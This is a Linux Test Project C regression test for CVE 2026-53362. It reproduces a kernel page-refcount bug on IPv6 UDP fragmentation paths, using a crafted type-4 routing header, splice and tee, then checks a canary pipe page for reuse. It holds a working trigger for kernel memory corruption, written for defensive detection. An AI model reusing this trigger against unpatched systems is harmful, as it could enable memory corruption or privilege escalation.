// SPDX-License-Identifier: GPL-2.0-or-later
/*
 * Copyright (C) 2026 SUSE LLC
 * Original reproducer by Massimiliano Oldani
 * Simplified LTP port: Martin Doucha <mdoucha@suse.com>
 */

/*
 * CVE 2026-53362
 *
 * Test for vulnerability in socket buffer size calculation for fragmented
 * UDP packets with gaps. Reproducer based on:
 * https://github.com/sgkdev/ipv6_frag_escape
 *
 * Memory corruption fixed in kernel v7.2:
 * 736b380e28d0 ("ipv6: account for fraggap on the paged allocation path")
 *
 * [Algorithm]
 *
 * - Fill pipe[0] with a known pattern (0x42) ("canary" page).
 * - Splice pages into a corked socket so the skb references pipe[0]'s page.
 * - Close the socket -> the corruption causes the page refcount to drop
 *   too low -> the page appears free while pipe[0] still owns it.
 * - Pollute all free memory with 0xBD (inverse of 0x42).
 * - Read pipe[0] back. If any byte changed, the page was reallocated
 *   while the pipe still held it -> the bug is confirmed.
 */

#define _GNU_SOURCE
#include <netinet/in.h>
#include <netinet/udp.h>

#include "tst_test.h"
#include "tst_net.h"
#include "lapi/splice.h"

#define PIPE_COUNT 2
#define PIPE_BUF_SIZE (1 << 20)

#define BUFSIZE 4096
#define PATTERN_SIZE 256
#define PATTERN_CHAR 0x42

#define TEST_HDRSIZE 640
#define TEST_MTU 1280
#define TEST_PORT 12345
#define TEST_MSGSIZE (1232 - TEST_HDRSIZE)

static int pipefds[PIPE_COUNT][2];
static int sockfd = -1;
static unsigned char buf[BUFSIZE];
static struct sockaddr_in6 addr;

static void setup(void)
{
	int i;

	for (i = 0; i < PIPE_COUNT; i++)
		pipefds[i][0] = pipefds[i][1] = -1;

	tst_init_sockaddr_inet6_bin(&addr, &in6addr_loopback, TEST_PORT);
}

static int leak_pipe(void)
{
	int i, padding, segcount = (TEST_HDRSIZE - 8) / 16;

	/* Create input pipe and fill it with test data */
	memset(buf, PATTERN_CHAR, PATTERN_SIZE);

	for (i = 0; i < PIPE_COUNT; i++) {
		SAFE_PIPE(pipefds[i]);
		SAFE_FCNTL(pipefds[i][1], F_SETPIPE_SZ, PIPE_BUF_SIZE);
	}

	SAFE_WRITE(SAFE_WRITE_ALL, pipefds[0][1], buf, PATTERN_SIZE);

	/* Create socket and set packet header with frag gap */
	sockfd = SAFE_SOCKET(AF_INET6, SOCK_DGRAM, 0);
	padding = TEST_HDRSIZE - 8 - 16 * segcount;
	memset(buf, 0, TEST_HDRSIZE);
	buf[1] = (TEST_HDRSIZE - 8) / 8;
	buf[2] = 4;
	buf[3] = (unsigned char)(segcount - 1);
	buf[4] = buf[3];

	for (i = 0; i < segcount; i++) {
		memcpy(buf + 8 + 16 * i, &in6addr_loopback,
			sizeof(in6addr_loopback));
	}

	if (padding)
		buf[9 + 16 * segcount] = (unsigned char)(padding - 2);

	TEST(setsockopt(sockfd, IPPROTO_IPV6, IPV6_RTHDR, buf, TEST_HDRSIZE));

	if (TST_RET == -1 && TST_ERR == EINVAL)
		tst_brk(TCONF, "IPV6_RTHDR type 4 is not supported");
	else if (TST_RET)
		tst_brk(TBROK | TTERRNO, "setsockopt(IPV6_RTHDR) failed");

	SAFE_SETSOCKOPT_INT(sockfd, IPPROTO_IPV6, IPV6_MTU, TEST_MTU);
	SAFE_CONNECT(sockfd, (struct sockaddr *)&addr, sizeof(addr));
	SAFE_SETSOCKOPT_INT(sockfd, IPPROTO_UDP, UDP_CORK, 1);

	/* Splice input pipe buffer page into socket */
	memset(buf, 0, TEST_MSGSIZE);
	buf[TEST_MSGSIZE - 6] = 1;
	SAFE_WRITE(SAFE_WRITE_ALL, pipefds[1][1], buf, TEST_MSGSIZE);
	SAFE_SPLICE(pipefds[1][0], NULL, sockfd, NULL, TEST_MSGSIZE, SPLICE_F_MORE);
	tee(pipefds[0][0], pipefds[1][1], PATTERN_SIZE, 0);
	SAFE_SPLICE(pipefds[1][0], NULL, sockfd, NULL, PATTERN_SIZE, SPLICE_F_MORE);
	SAFE_CLOSE(sockfd);

	/* Check whether pipe buffer got reused while still allocated */
	tst_pollute_memory(0, ~(unsigned char)PATTERN_CHAR);
	SAFE_READ(SAFE_READ_ALL, pipefds[0][0], buf, PATTERN_SIZE);

	for (i = 0; i < PIPE_COUNT; i++) {
		SAFE_CLOSE(pipefds[i][0]);
		SAFE_CLOSE(pipefds[i][1]);
	}

	for (i = 0; i < PATTERN_SIZE; i++) {
		if (buf[i] != PATTERN_CHAR)
			return 1;
	}

	return 0;
}

static void run(void)
{
	int i, leaked = 0;

	for (i = 0; i < 64; i++) {
		if (tst_remaining_runtime() <= 0)
			break;

		leaked = leak_pipe();

		if (leaked)
			break;
	}

	if (leaked) {
		tst_res(TFAIL, "Pipe buffer was corrupted");
		return;
	}

	tst_res(TPASS, "Nothing bad happened (yet)");
}

static void cleanup(void)
{
	int i;

	for (i = 0; i < PIPE_COUNT; i++) {
		if (pipefds[i][0] != -1) {
			SAFE_CLOSE(pipefds[i][0]);
			SAFE_CLOSE(pipefds[i][1]);
		}
	}

	if (sockfd != -1)
		SAFE_CLOSE(sockfd);
}

static struct tst_test test = {
	.test_all = run,
	.setup = setup,
	.cleanup = cleanup,
	.runtime = 300,
	.min_runtime = 30,
	.taint_check = TST_TAINT_W | TST_TAINT_D,
	.tags = (const struct tst_tag[]) {
		{"linux-git", "736b380e28d0480c7bc3e022f1950f31fe53a7c5"},
		{"CVE", "2026-53362"},
		{}
	},
};
